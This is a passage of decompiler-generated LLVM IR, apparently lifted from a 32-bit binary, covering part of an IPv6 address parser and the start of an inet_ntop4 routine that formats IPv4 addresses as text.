dec_label_pc_805df49:                             ; preds = %dec_label_pc_805df2e
  %v2_805df4e = ptrtoint i32* %stack_var_-32 to i32
  store i32 %v2_805df4e, i32* %eax.global-to-local, align 4
  %tmp60 = bitcast i32* %stack_var_-32 to i8*
  %v5_805df53 = call i32 @__GI_memset(i8* %tmp60, i32 0, i32 16)
  store i32 %v5_805df53, i32* @ebx, align 4
  %v2_805df5a = add i32 %v5_805df53, 16
  store i32 %v2_805df5a, i32* %eax.global-to-local, align 4
  %v0_805df64 = load i32, i32* @edi, align 4
  %v1_805df64 = inttoptr i32 %v0_805df64 to i8*
  %v2_805df64 = load i8, i8* %v1_805df64, align 1
  %v11_805df64 = icmp eq i8 %v2_805df64, 58
  %v1_805df67 = icmp eq i1 %v11_805df64, false
  br i1 %v1_805df67, label %dec_label_pc_805dffa, label %dec_label_pc_805df69

dec_label_pc_805df69:                             ; preds = %dec_label_pc_805df49
  %v1_805df69 = add i32 %v0_805df64, 1
  store i32 %v1_805df69, i32* @edi, align 4
  %v1_805df6a = inttoptr i32 %v1_805df69 to i8*
  %v2_805df6a = load i8, i8* %v1_805df6a, align 1
  %v11_805df6a = icmp eq i8 %v2_805df6a, 58
  %v1_805df6d = icmp eq i1 %v11_805df6a, false
  br i1 %v1_805df6d, label %dec_label_pc_805e0da, label %dec_label_pc_805dffa

dec_label_pc_805df81:                             ; preds = %dec_label_pc_805e03a
  %v4_805df89 = call i32 @__GI_strchr(i8* getelementptr inbounds ([17 x i8], [17 x i8]* @global_var_806d777.719, i32 0, i32 0), i32 %v2_805e041)
  store i32 %v4_805df89, i32* %eax.global-to-local, align 4
  %v0_805df8e = load i32, i32* @edi, align 4
  %v1_805df8e = add i32 %v0_805df8e, 1
  store i32 %v1_805df8e, i32* @edi, align 4
  %v1_805df92 = icmp eq i32 %v4_805df89, 0
  br i1 %v1_805df92, label %dec_label_pc_805dfb1, label %dec_label_pc_805df96

dec_label_pc_805df96:                             ; preds = %dec_label_pc_805df81
  %v0_805df96 = load i32, i32* @ebp, align 4
  %v2_805df96 = mul i32 %v0_805df96, 16
  %v1_805df99 = add i32 %v4_805df89, -134666103
  store i32 %v1_805df99, i32* %eax.global-to-local, align 4
  %v2_805df9e = or i32 %v2_805df96, %v1_805df99
  store i32 %v2_805df9e, i32* @ebp, align 4
  %tmp128 = icmp ult i32 %v2_805df9e, 65536
  br i1 %tmp128, label %dec_label_pc_805e03a.outer, label %dec_label_pc_805e0da

dec_label_pc_805e03a.outer:                       ; preds = %dec_label_pc_805df96, %dec_label_pc_805dffa
  %v0_805e03d36 = phi i32 [ %v1_805df8e, %dec_label_pc_805df96 ], [ %stack_var_-36.0.in, %dec_label_pc_805dffa ]
  %stack_var_-44.1.ph = phi i8* [ %stack_var_-44.1, %dec_label_pc_805df96 ], [ %stack_var_-44.0, %dec_label_pc_805dffa ]
  %stack_var_-36.1.ph = phi i8* [ %stack_var_-36.1, %dec_label_pc_805df96 ], [ %stack_var_-36.0, %dec_label_pc_805dffa ]
  %stack_var_-48.0.ph = phi i32 [ 1, %dec_label_pc_805df96 ], [ 0, %dec_label_pc_805dffa ]
  %v4_805dfb6 = icmp eq i32 %stack_var_-48.0.ph, 0
  %v1_805dfbb = icmp eq i1 %v4_805dfb6, false
  br label %dec_label_pc_805e03a

dec_label_pc_805dfb1:                             ; preds = %dec_label_pc_805df81
  %v0_805dfb1 = load i32, i32* @esi, align 4
  %v9_805dfb1 = icmp eq i32 %v0_805dfb1, 58
  %v1_805dfb4 = icmp eq i1 %v9_805dfb1, false
  br i1 %v1_805dfb4, label %dec_label_pc_805e006, label %dec_label_pc_805dfb6

dec_label_pc_805dfb6:                             ; preds = %dec_label_pc_805dfb1
  br i1 %v1_805dfbb, label %dec_label_pc_805dfd2, label %dec_label_pc_805dfbd

dec_label_pc_805dfbd:                             ; preds = %dec_label_pc_805dfb6
  %v5_805dfbd = icmp eq i8* %stack_var_-44.1, null
  %v1_805dfc2 = icmp eq i1 %v5_805dfbd, false
  br i1 %v1_805dfc2, label %dec_label_pc_805e0da, label %dec_label_pc_805dfc8

dec_label_pc_805dfc8:                             ; preds = %dec_label_pc_805dfbd
  %v0_805dfc8 = load i32, i32* @ebx, align 4
  %v5_805dfc8 = inttoptr i32 %v0_805dfc8 to i8*
  %v5_805dfcc = inttoptr i32 %v1_805df8e to i8*
  br label %dec_label_pc_805e03a

dec_label_pc_805dfd2:                             ; preds = %dec_label_pc_805dfb6
  %v1_805dfd2 = inttoptr i32 %v1_805df8e to i8*
  %v2_805dfd2 = load i8, i8* %v1_805dfd2, align 1
  %v3_805dfd2 = icmp eq i8 %v2_805dfd2, 0
  br i1 %v3_805dfd2, label %dec_label_pc_805e0da, label %dec_label_pc_805dfdb

dec_label_pc_805dfdb:                             ; preds = %dec_label_pc_805dfd2
  %v0_805dfdb = load i32, i32* @ebx, align 4
  %v1_805dfdb = add i32 %v0_805dfdb, 2
  store i32 %v1_805dfdb, i32* @edx, align 4
  %v6_805dfe2 = icmp ugt i32 %v1_805dfdb, %v2_805df5a
  br i1 %v6_805dfe2, label %dec_label_pc_805e0da, label %dec_label_pc_805dfe8

dec_label_pc_805dfe8:                             ; preds = %dec_label_pc_805dfdb
  %v0_805dfe8 = load i32, i32* @ebp, align 4
  %v2_805dfea = udiv i32 %v0_805dfe8, 256
  %v4_805dfea = trunc i32 %v2_805dfea to i8
  %v3_805dfed = inttoptr i32 %v0_805dfdb to i8*
  store i8 %v4_805dfea, i8* %v3_805dfed, align 1
  %v0_805dfef = load i32, i32* @ebp, align 4
  store i32 %v0_805dfef, i32* %eax.global-to-local, align 4
  %v1_805dff1 = trunc i32 %v0_805dfef to i8
  %v2_805dff1 = load i32, i32* @ebx, align 4
  %v3_805dff1 = add i32 %v2_805dff1, 1
  %v4_805dff1 = inttoptr i32 %v3_805dff1 to i8*
  store i8 %v1_805dff1, i8* %v4_805dff1, align 1
  %v0_805dff4 = load i32, i32* @edx, align 4
  store i32 %v0_805dff4, i32* @ebx, align 4
  %stack_var_-36.0.in.pre = load i32, i32* @edi, align 4
  br label %dec_label_pc_805dffa

dec_label_pc_805dffa:                             ; preds = %dec_label_pc_805df49, %dec_label_pc_805df69, %dec_label_pc_805dfe8
  %stack_var_-36.0.in = phi i32 [ %stack_var_-36.0.in.pre, %dec_label_pc_805dfe8 ], [ %v1_805df69, %dec_label_pc_805df69 ], [ %v0_805df64, %dec_label_pc_805df49 ]
  %stack_var_-44.0 = phi i8* [ %stack_var_-44.1, %dec_label_pc_805dfe8 ], [ null, %dec_label_pc_805df69 ], [ null, %dec_label_pc_805df49 ]
  %stack_var_-36.0 = inttoptr i32 %stack_var_-36.0.in to i8*
  store i32 0, i32* @ebp, align 4
  br label %dec_label_pc_805e03a.outer

dec_label_pc_805e006:                             ; preds = %dec_label_pc_805dfb1
  %v9_805e006 = icmp eq i32 %v0_805dfb1, 46
  %v1_805e009 = icmp eq i1 %v9_805e006, false
  br i1 %v1_805e009, label %dec_label_pc_805e0da, label %dec_label_pc_805e00f

dec_label_pc_805e00f:                             ; preds = %dec_label_pc_805e006
  %v0_805e00f = load i32, i32* @ebx, align 4
  %v1_805e00f = add i32 %v0_805e00f, 4
  store i32 %v1_805e00f, i32* @esi, align 4
  %v6_805e016 = icmp ugt i32 %v1_805e00f, %v2_805df5a
  br i1 %v6_805e016, label %dec_label_pc_805e0da, label %dec_label_pc_805e01c

dec_label_pc_805e01c:                             ; preds = %dec_label_pc_805e00f
  store i32 %v0_805e00f, i32* @edx, align 4
  %v4_805e01e = ptrtoint i8* %stack_var_-36.1 to i32
  store i32 %v4_805e01e, i32* @eax, align 4
  %v2_805e022 = ptrtoint i8* %stack_var_-44.1 to i32
  %v5_805e022 = call i32 @inet_pton4(i32 %stack_var_-48.0.ph, i32 %v2_805e022, i32 %v2_805df5a)
  store i32 %v5_805e022, i32* %eax.global-to-local, align 4
  %v0_805e027 = load i32, i32* @esi, align 4
  %tmp61 = icmp slt i32 %v5_805e022, 1
  %tmp62 = icmp eq i1 %tmp61, false
  br i1 %tmp62, label %dec_label_pc_805e071, label %dec_label_pc_805e0da

dec_label_pc_805e03a:                             ; preds = %dec_label_pc_805e03a.outer, %dec_label_pc_805dfc8
  %v0_805e03d = phi i32 [ %v1_805df8e, %dec_label_pc_805dfc8 ], [ %v0_805e03d36, %dec_label_pc_805e03a.outer ]
  %stack_var_-44.1 = phi i8* [ %v5_805dfc8, %dec_label_pc_805dfc8 ], [ %stack_var_-44.1.ph, %dec_label_pc_805e03a.outer ]
  %stack_var_-36.1 = phi i8* [ %v5_805dfcc, %dec_label_pc_805dfc8 ], [ %stack_var_-36.1.ph, %dec_label_pc_805e03a.outer ]
  %v1_805e03d = inttoptr i32 %v0_805e03d to i8*
  %v2_805e03d = load i8, i8* %v1_805e03d, align 1
  %v3_805e03d = sext i8 %v2_805e03d to i32
  store i32 %v3_805e03d, i32* %eax.global-to-local, align 4
  %v2_805e041 = call i32 @__GI_tolower(i32 %v3_805e03d)
  store i32 %v2_805e041, i32* %eax.global-to-local, align 4
  store i32 %v2_805e041, i32* @esi, align 4
  %v1_805e04b = icmp eq i32 %v2_805e041, 0
  %v1_805e04d = icmp eq i1 %v1_805e04b, false
  br i1 %v1_805e04d, label %dec_label_pc_805df81, label %dec_label_pc_805e053

dec_label_pc_805e053:                             ; preds = %dec_label_pc_805e03a
  %v0_805e0a9.pre.pre = load i32, i32* @ebx, align 4
  br i1 %v4_805dfb6, label %dec_label_pc_805e071, label %dec_label_pc_805e05a

dec_label_pc_805e05a:                             ; preds = %dec_label_pc_805e053
  %v1_805e05a = add i32 %v0_805e0a9.pre.pre, 2
  store i32 %v1_805e05a, i32* @edx, align 4
  %v6_805e061 = icmp ugt i32 %v1_805e05a, %v2_805df5a
  br i1 %v6_805e061, label %dec_label_pc_805e0da, label %dec_label_pc_805e063

dec_label_pc_805e063:                             ; preds = %dec_label_pc_805e05a
  %v0_805e063 = load i32, i32* @ebp, align 4
  %v2_805e065 = udiv i32 %v0_805e063, 256
  %v4_805e065 = trunc i32 %v2_805e065 to i8
  %v3_805e068 = inttoptr i32 %v0_805e0a9.pre.pre to i8*
  store i8 %v4_805e065, i8* %v3_805e068, align 1
  %v0_805e06a = load i32, i32* @ebp, align 4
  store i32 %v0_805e06a, i32* %eax.global-to-local, align 4
  %v1_805e06c = trunc i32 %v0_805e06a to i8
  %v2_805e06c = load i32, i32* @ebx, align 4
  %v3_805e06c = add i32 %v2_805e06c, 1
  %v4_805e06c = inttoptr i32 %v3_805e06c to i8*
  store i8 %v1_805e06c, i8* %v4_805e06c, align 1
  %v0_805e06f = load i32, i32* @edx, align 4
  br label %dec_label_pc_805e071

dec_label_pc_805e071:                             ; preds = %dec_label_pc_805e053, %dec_label_pc_805e01c, %dec_label_pc_805e063
  %v0_805e0a9.pre = phi i32 [ %v0_805e027, %dec_label_pc_805e01c ], [ %v0_805e06f, %dec_label_pc_805e063 ], [ %v0_805e0a9.pre.pre, %dec_label_pc_805e053 ]
  %v4_805e071 = ptrtoint i8* %stack_var_-44.1 to i32
  %v5_805e071 = icmp eq i8* %stack_var_-44.1, null
  br i1 %v5_805e071, label %dec_label_pc_805e0a9, label %dec_label_pc_805e078

dec_label_pc_805e078:                             ; preds = %dec_label_pc_805e071
  store i32 1, i32* @esi, align 4
  %v6_805e07f = sub i32 %v0_805e0a9.pre, %v4_805e071
  store i32 %v6_805e07f, i32* @edi, align 4
  %v16_805e083 = icmp eq i32 %v0_805e0a9.pre, %v2_805df5a
  %v1_805e087 = icmp eq i1 %v16_805e083, false
  br i1 %v1_805e087, label %dec_label_pc_805e0a1.preheader, label %dec_label_pc_805e0da

dec_label_pc_805e0a1.preheader:                   ; preds = %dec_label_pc_805e078
  %v3_805e0a191 = inttoptr i32 %v6_805e07f to i8*
  %v9_805e0a399 = icmp slt i8* %v3_805e0a191, inttoptr (i32 1 to i8*)
  br i1 %v9_805e0a399, label %dec_label_pc_805e0a5, label %dec_label_pc_805e08b

dec_label_pc_805e08b:                             ; preds = %dec_label_pc_805e0a1.preheader, %dec_label_pc_805e08b
  %v0_805e099101 = phi i32 [ %v0_805e0a1.pre, %dec_label_pc_805e08b ], [ 1, %dec_label_pc_805e0a1.preheader ]
  %v0_805e08b100 = phi i32 [ %v1_805e0a1.pre, %dec_label_pc_805e08b ], [ %v6_805e07f, %dec_label_pc_805e0a1.preheader ]
  %v2_805e091 = sub i32 %v0_805e08b100, %v0_805e099101
  %v2_805e093 = sub i32 %v2_805df5a, %v0_805e099101
  store i32 %v2_805e093, i32* @ecx, align 4
  %v6_805e095 = add i32 %v2_805e091, %v4_805e071
  store i32 %v6_805e095, i32* %eax.global-to-local, align 4
  %v1_805e099 = add i32 %v0_805e099101, 1
  store i32 %v1_805e099, i32* @esi, align 4
  %v1_805e09a = inttoptr i32 %v6_805e095 to i8*
  %v2_805e09a = load i8, i8* %v1_805e09a, align 1
  %v3_805e09a = zext i8 %v2_805e09a to i32
  %v4_805e09a = load i32, i32* @edx, align 4
  %v5_805e09a = and i32 %v4_805e09a, -256
  %v6_805e09a = or i32 %v5_805e09a, %v3_805e09a
  store i32 %v6_805e09a, i32* @edx, align 4
  %v3_805e09c = inttoptr i32 %v2_805e093 to i8*
  store i8 %v2_805e09a, i8* %v3_805e09c, align 1
  %v0_805e09e = load i32, i32* %eax.global-to-local, align 4
  %v1_805e09e = inttoptr i32 %v0_805e09e to i8*
  store i8 0, i8* %v1_805e09e, align 1
  %v0_805e0a1.pre = load i32, i32* @esi, align 4
  %v1_805e0a1.pre = load i32, i32* @edi, align 4
  %v2_805e0a1 = inttoptr i32 %v0_805e0a1.pre to i8*
  %v3_805e0a1 = inttoptr i32 %v1_805e0a1.pre to i8*
  %v9_805e0a3 = icmp sgt i8* %v2_805e0a1, %v3_805e0a1
  br i1 %v9_805e0a3, label %dec_label_pc_805e0a5, label %dec_label_pc_805e08b

dec_label_pc_805e0a5:                             ; preds = %dec_label_pc_805e08b, %dec_label_pc_805e0a1.preheader
  br label %dec_label_pc_805e0a9

dec_label_pc_805e0a9:                             ; preds = %dec_label_pc_805e071, %dec_label_pc_805e0a5
  %v0_805e0a9 = phi i32 [ %v2_805df5a, %dec_label_pc_805e0a5 ], [ %v0_805e0a9.pre, %dec_label_pc_805e071 ]
  %v16_805e0a9 = icmp eq i32 %v0_805e0a9, %v2_805df5a
  %v1_805e0ad = icmp eq i1 %v16_805e0a9, false
  br i1 %v1_805e0ad, label %dec_label_pc_805e0da, label %dec_label_pc_805e0af

dec_label_pc_805e0af:                             ; preds = %dec_label_pc_805e0a9
  store i32 %v2_805df4e, i32* %eax.global-to-local, align 4
  %tmp63 = inttoptr i32 %arg3 to i16*
  %v5_805e0bb = call i32 @memcpy(i16* %tmp63, i32 %v2_805df4e, i32 16)
  store i32 1, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_805e0dc

dec_label_pc_805e0ca:                             ; preds = %dec_label_pc_805df2e
  %v1_805e0ca = call i32 @__errno_location(i32 %v0_805df1d)
  %v1_805e0cf = inttoptr i32 %v1_805e0ca to i32*
  store i32 97, i32* %v1_805e0cf, align 4
  store i32 -1, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_805e0dc

dec_label_pc_805e0da:                             ; preds = %dec_label_pc_805dfdb, %dec_label_pc_805dfd2, %dec_label_pc_805df96, %dec_label_pc_805dfbd, %dec_label_pc_805e078, %dec_label_pc_805e01c, %dec_label_pc_805e0a9, %dec_label_pc_805e05a, %dec_label_pc_805e00f, %dec_label_pc_805e006, %dec_label_pc_805df69
  store i32 0, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_805e0dc

dec_label_pc_805e0dc:                             ; preds = %dec_label_pc_805e0ca, %dec_label_pc_805e0af, %dec_label_pc_805df39, %dec_label_pc_805e0da
  %v0_805e0e3 = phi i32 [ -1, %dec_label_pc_805e0ca ], [ 1, %dec_label_pc_805e0af ], [ %v3_805df3f, %dec_label_pc_805df39 ], [ 0, %dec_label_pc_805e0da ]
  store i32 %v0_805df1d, i32* @ebx, align 4
  store i32 %v0_805df1c, i32* @esi, align 4
  store i32 %v0_805df1b, i32* @edi, align 4
  store i32 %v0_805df1a, i32* @ebp, align 4
  ret i32 %v0_805e0e3

; uselistorder directives
  uselistorder i32 %v1_805e0a1.pre, { 1, 0 }
  uselistorder i32 %v0_805e0a1.pre, { 1, 0 }
  uselistorder i32 %v0_805e099101, { 2, 1, 0 }
  uselistorder i32 %v0_805e0a9.pre, { 2, 0, 1 }
  uselistorder i32 %v0_805e0a9.pre.pre, { 0, 2, 1 }
  uselistorder i32 %v2_805e041, { 2, 1, 3, 0 }
  uselistorder i8* %stack_var_-36.1, { 1, 0 }
  uselistorder i8* %stack_var_-44.1, { 1, 0, 4, 5, 3, 2 }
  uselistorder i32 %stack_var_-36.0.in, { 1, 0 }
  uselistorder i32 %v1_805df8e, { 3, 0, 2, 1, 4 }
  uselistorder i32 %v2_805df5a, { 0, 2, 3, 1, 7, 4, 5, 6, 8 }
  uselistorder i32 %v0_805df1d, { 0, 2, 1 }
  uselistorder i32* %eax.global-to-local, { 0, 1, 2, 3, 4, 5, 6, 11, 12, 7, 8, 9, 10, 13, 14, 15, 16 }
  uselistorder i32 (i32, i32, i32)* @inet_pton4, { 1, 0 }
  uselistorder i32 %arg3, { 1, 0 }
  uselistorder label %dec_label_pc_805e0dc, { 3, 0, 1, 2 }
  uselistorder label %dec_label_pc_805e0da, { 6, 4, 7, 5, 8, 9, 0, 1, 3, 2, 10 }
  uselistorder label %dec_label_pc_805e0a9, { 1, 0 }
  uselistorder label %dec_label_pc_805e08b, { 1, 0 }
  uselistorder label %dec_label_pc_805e071, { 2, 0, 1 }
  uselistorder label %dec_label_pc_805e03a, { 1, 0 }
  uselistorder label %dec_label_pc_805dffa, { 2, 1, 0 }
  uselistorder label %dec_label_pc_805e03a.outer, { 1, 0 }
}

define i32 @inet_ntop4(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %eax.global-to-local = alloca i32, align 4
  %ebp.global-to-local = alloca i32, align 4
  %ebx.global-to-local = alloca i32, align 4
  %ecx.global-to-local = alloca i32, align 4
  %edi.global-to-local = alloca i32, align 4
  %edx.global-to-local = alloca i32, align 4
  %stack_var_-60 = alloca i8*, align 4
  %stack_var_-92 = alloca i8*, align 4
  %stack_var_-33 = alloca i32, align 4
  %stack_var_-31 = alloca i32, align 4
  %v0_805e0e5 = load i32, i32* @edi, align 4
  %v0_805e0e6 = load i32, i32* @esi, align 4
  store i32 0, i32* %ebp.global-to-local, align 4
  store i1 false, i1* @df, align 1
  %v0_805e0ee = load i32, i32* @eax, align 4
  %v3_805e0f2 = and i32 %v0_805e0ee, -65536
  store i32 %v3_805e0f2, i32* %stack_var_-33, align 4
  %v2_805e0fd = ptrtoint i32* %stack_var_-31 to i32
  store i32 0, i32* %eax.global-to-local, align 4
  %v0_805e103 = load i32, i32* @edx, align 4
  %v5_805e103 = inttoptr i32 %v0_805e103 to i8*
  store i8* %v5_805e103, i8** %stack_var_-60, align 4
  %v0_805e107 = load i32, i32* @ecx, align 4
  store i32 0, i32* %ebx.global-to-local, align 4
  store i32 0, i32* %stack_var_-31, align 4
  %v6_805e10d = add i32 %v2_805e0fd, 4
  store i32 %v6_805e10d, i32* %edi.global-to-local, align 4
  %v2_805e10e = inttoptr i32 %v6_805e10d to i32*
  store i32 0, i32* %v2_805e10e, align 4
  %v3_805e10e = load i32, i32* %edi.global-to-local, align 4
  %v6_805e10e = add i32 %v3_805e10e, 4
  store i32 %v6_805e10e, i32* %edi.global-to-local, align 4
  %v0_805e10f = load i32, i32* %eax.global-to-local, align 4
  %v2_805e10f = inttoptr i32 %v6_805e10e to i32*
  store i32 %v0_805e10f, i32* %v2_805e10f, align 4
  %v3_805e10f = load i32, i32* %edi.global-to-local, align 4
  %v6_805e10f = add i32 %v3_805e10f, 4
  store i32 %v6_805e10f, i32* %edi.global-to-local, align 4
  %v0_805e110 = load i32, i32* %eax.global-to-local, align 4
  %v1_805e110 = trunc i32 %v0_805e110 to i16
  %v3_805e110 = inttoptr i32 %v6_805e10f to i16*
  store i16 %v1_805e110, i16* %v3_805e110, align 2
  %v4_805e110 = load i32, i32* %edi.global-to-local, align 4
  %v7_805e110 = add i32 %v4_805e110, 2
  store i32 %v7_805e110, i32* %edi.global-to-local, align 4
  %v0_805e112 = load i32, i32* %eax.global-to-local, align 4
  %v1_805e112 = trunc i32 %v0_805e112 to i8
  %v3_805e112 = inttoptr i32 %v7_805e110 to i8*
  store i8 %v1_805e112, i8* %v3_805e112, align 1
  %v0_805e1a226 = load i32, i32* %ebp.global-to-local, align 4
  %v7_805e1a532 = icmp sgt i32 %v0_805e1a226, 3
  br i1 %v7_805e1a532, label %dec_label_pc_805e1ab, label %dec_label_pc_805e118

dec_label_pc_805e118:                             ; preds = %entry, %dec_label_pc_805e180
  %v0_805e1a233 = phi i32 [ %v0_805e1a2, %dec_label_pc_805e180 ], [ %v0_805e1a226, %entry ]
  %v0_805e11c = load i32, i32* @ecx, align 4
  %v1_805e11c = and i32 %v0_805e11c, -256
  %v2_805e11c = or i32 %v1_805e11c, 100
  store i32 %v2_805e11c, i32* %ecx.global-to-local, align 4
  %v2_805e11e = add i32 %v0_805e1a233, %v0_805e0ee
  store i32 %v2_805e11e, i32* %eax.global-to-local, align 4
  %v0_805e120 = load i32, i32* %ebx.global-to-local, align 4
  %v1_805e120 = add i32 %v0_805e120, 1
  store i32 %v1_805e120, i32* @esi, align 4
  store i32 %v0_805e120, i32* @edi, align 4
  %v1_805e129 = inttoptr i32 %v2_805e11e to i8*
  %v2_805e129 = load i8, i8* %v1_805e129, align 1
  %v3_805e129 = zext i8 %v2_805e129 to i32
  %v4_805e129 = load i32, i32* @edx, align 4
  %v5_805e129 = and i32 %v4_805e129, -65536
  %v6_805e129 = or i32 %v5_805e129, %v3_805e129
  store i32 %v6_805e129, i32* %edx.global-to-local, align 4
  %div = udiv i8 %v2_805e129, 100
  %v6_805e12f = zext i8 %div to i32
  %v4_805e131 = or i32 %v6_805e12f, %v1_805e11c
  store i32 %v4_805e131, i32* %ecx.global-to-local, align 4
  %v1_805e133 = or i32 %v4_805e131, 48
  store i32 %v1_805e133, i32* %eax.global-to-local, align 4
  %v1_805e136 = trunc i32 %v1_805e133 to i8
  %v2_805e136 = load i32, i32* @esp, align 4
  %v4_805e136 = add i32 %v0_805e120, 43
  %v5_805e136 = add i32 %v4_805e136, %v2_805e136
  %v6_805e136 = inttoptr i32 %v5_805e136 to i8*
  store i8 %v1_805e136, i8* %v6_805e136, align 1
  %v0_805e13a = load i32, i32* %eax.global-to-local, align 4
  %v1_805e13a = trunc i32 %v0_805e13a to i8
  %v7_805e13a = icmp eq i8 %v1_805e13a, 48
  %v1_805e13c = icmp eq i1 %v7_805e13a, false
  %v0_805e162 = load i32, i32* %ecx.global-to-local, align 4
  %v1_805e162 = and i32 %v0_805e162, -256
  %v2_805e162 = or i32 %v1_805e162, 10
  store i32 %v2_805e162, i32* %ecx.global-to-local, align 4
  %v0_805e164 = load i32, i32* %edx.global-to-local, align 4
  store i32 %v0_805e164, i32* %eax.global-to-local, align 4
  %v3_805e166 = trunc i32 %v0_805e164 to i16
  %v5_805e166 = udiv i16 %v3_805e166, 10
  br i1 %v1_805e13c, label %dec_label_pc_805e162, label %dec_label_pc_805e13e

dec_label_pc_805e13e:                             ; preds = %dec_label_pc_805e118
  %v9_805e142 = and i32 %v0_805e164, -65536
  %tmp = urem i16 %v5_805e166, 256
  store i32 10, i32* %ecx.global-to-local, align 4
  %div34 = udiv i16 %tmp, 10
  %v7_805e14f = zext i16 %div34 to i32
  %v11_805e14f = or i32 %v7_805e14f, %v9_805e142
  store i32 %v11_805e14f, i32* %eax.global-to-local, align 4
  %tmp36 = urem i16 %tmp, 10
  %v12_805e14f = zext i16 %tmp36 to i32
  %v1_805e152 = or i32 %v12_805e14f, 48
  %v8_805e152 = trunc i32 %v1_805e152 to i8
  store i32 %v1_805e152, i32* %edx.global-to-local, align 4
  %v2_805e155 = load i32, i32* @esp, align 4
  %v3_805e155 = load i32, i32* %ebx.global-to-local, align 4
  %v4_805e155 = add i32 %v2_805e155, 43
  %v5_805e155 = add i32 %v4_805e155, %v3_805e155
  %v6_805e155 = inttoptr i32 %v5_805e155 to i8*
  store i8 %v8_805e152, i8* %v6_805e155, align 1
  %v0_805e159 = load i32, i32* %edx.global-to-local, align 4
  %v1_805e159 = trunc i32 %v0_805e159 to i8
  %v7_805e159 = icmp eq i8 %v1_805e159, 48
  br i1 %v7_805e159, label %dec_label_pc_805e180, label %dec_label_pc_805e15e

dec_label_pc_805e15e:                             ; preds = %dec_label_pc_805e13e
  %v0_805e15e = load i32, i32* @esi, align 4
  store i32 %v0_805e15e, i32* @edi, align 4
  br label %dec_label_pc_805e180

dec_label_pc_805e162:                             ; preds = %dec_label_pc_805e118
  %tmp37 = urem i16 %v5_805e166, 256
  %v3_805e168 = and i32 %v0_805e164, -65536
  store i32 10, i32* %ecx.global-to-local, align 4
  %div35 = udiv i16 %tmp37, 10
  %v7_805e173 = zext i16 %div35 to i32
  %v11_805e173 = or i32 %v7_805e173, %v3_805e168
  store i32 %v11_805e173, i32* %eax.global-to-local, align 4
  %tmp38 = urem i16 %tmp37, 10
  %v12_805e173 = zext i16 %tmp38 to i32
  %v1_805e176 = or i32 %v12_805e173, 48
  %v8_805e176 = trunc i32 %v1_805e176 to i8
  store i32 %v1_805e176, i32* %edx.global-to-local, align 4
  %v0_805e179 = load i32, i32* %ebx.global-to-local, align 4
  %v1_805e179 = add i32 %v0_805e179, 2
  store i32 %v1_805e179, i32* @edi, align 4
  %v2_805e17c = load i32, i32* @esp, align 4
  %v3_805e17c = load i32, i32* @esi, align 4
  %v4_805e17c = add i32 %v2_805e17c, 43
  %v5_805e17c = add i32 %v4_805e17c, %v3_805e17c
  %v6_805e17c = inttoptr i32 %v5_805e17c to i8*
  store i8 %v8_805e176, i8* %v6_805e17c, align 1
  br label %dec_label_pc_805e180

dec_label_pc_805e180:                             ; preds = %dec_label_pc_805e13e, %dec_label_pc_805e15e, %dec_label_pc_805e162
  store i32 %v2_805e11e, i32* %edx.global-to-local, align 4
  store i32 10, i32* @ecx, align 4
  %v0_805e189 = load i32, i32* @edi, align 4
  %v1_805e189 = add i32 %v0_805e189, 2
  store i32 %v1_805e189, i32* %ebx.global-to-local, align 4
  %v0_805e18c = load i32, i32* %ebp.global-to-local, align 4
  %v1_805e18c = add i32 %v0_805e18c, 1
  store i32 %v1_805e18c, i32* %ebp.global-to-local, align 4
  %v2_805e18d = load i8, i8* %v1_805e129, align 1
  %v3_805e18d = zext i8 %v2_805e18d to i32
  %v4_805e18d = load i32, i32* %eax.global-to-local, align 4
  %v5_805e18d = and i32 %v4_805e18d, -65536
  %v6_805e18d = or i32 %v5_805e18d, %v3_805e18d
  store i32 %v6_805e18d, i32* %eax.global-to-local, align 4
  store i32 0, i32* %edx.global-to-local, align 4
  %v0_805e193 = load i32, i32* @esp, align 4
  %v2_805e193 = add i32 %v0_805e189, 44
  %v3_805e193 = add i32 %v2_805e193, %v0_805e193
  %v4_805e193 = inttoptr i32 %v3_805e193 to i8*
  store i8 46, i8* %v4_805e193, align 1
  %v0_805e198 = load i32, i32* @ecx, align 4
  %v1_805e198 = load i32, i32* %eax.global-to-local, align 4
  %v2_805e198 = urem i32 %v1_805e198, 65536
  %v3_805e198 = load i32, i32* %edx.global-to-local, align 4
  %v4_805e198 = mul i32 %v3_805e198, 65536
  %v5_805e198 = or i32 %v4_805e198, %v2_805e198
  %v6_805e198 = urem i32 %v0_805e198, 65536
  %v7_805e198 = udiv i32 %v5_805e198, %v6_805e198
  %v8_805e198 = urem i32 %v7_805e198, 65536
  %v10_805e198 = and i32 %v1_805e198, -65536
  %v11_805e198 = or i32 %v8_805e198, %v10_805e198
  store i32 %v11_805e198, i32* %eax.global-to-local, align 4
  %v12_805e198 = urem i32 %v5_805e198, %v6_805e198
  %v14_805e198 = and i32 %v3_805e198, -65536
  %v15_805e198 = or i32 %v12_805e198, %v14_805e198
  %v1_805e19b = add i32 %v15_805e198, 48
  %v8_805e19b = trunc i32 %v1_805e19b to i8
  store i32 %v1_805e19b, i32* @edx, align 4
  %v2_805e19e = load i32, i32* @esp, align 4
  %v3_805e19e = load i32, i32* @edi, align 4
  %v4_805e19e = add i32 %v2_805e19e, 43
  %v5_805e19e = add i32 %v4_805e19e, %v3_805e19e
  %v6_805e19e = inttoptr i32 %v5_805e19e to i8*
  store i8 %v8_805e19b, i8* %v6_805e19e, align 1
  %v0_805e1a2 = load i32, i32* %ebp.global-to-local, align 4
  %v7_805e1a5 = icmp sgt i32 %v0_805e1a2, 3
  br i1 %v7_805e1a5, label %dec_label_pc_805e1ab, label %dec_label_pc_805e118

dec_label_pc_805e1ab:                             ; preds = %dec_label_pc_805e180, %entry
  %v0_805e1ab = load i32, i32* @esp, align 4
  %v1_805e1ab = load i32, i32* %ebx.global-to-local, align 4
  %v2_805e1ab = add i32 %v0_805e1ab, 42
  %v3_805e1ab = add i32 %v2_805e1ab, %v1_805e1ab
  %v4_805e1ab = inttoptr i32 %v3_805e1ab to i8*
  store i8 0, i8* %v4_805e1ab, align 1
  %v2_805e1b3 = ptrtoint i32* %stack_var_-33 to i32
  store i32 %v2_805e1b3, i32* %ebx.global-to-local, align 4
  %tmp23 = bitcast i32* %stack_var_-33 to i8*
  store i8* %tmp23, i8** %stack_var_-92, align 4
  %v3_805e1b8 = call i32 @strlen(i8* %tmp23)
  store i32 %v3_805e1b8, i32* @eax, align 4
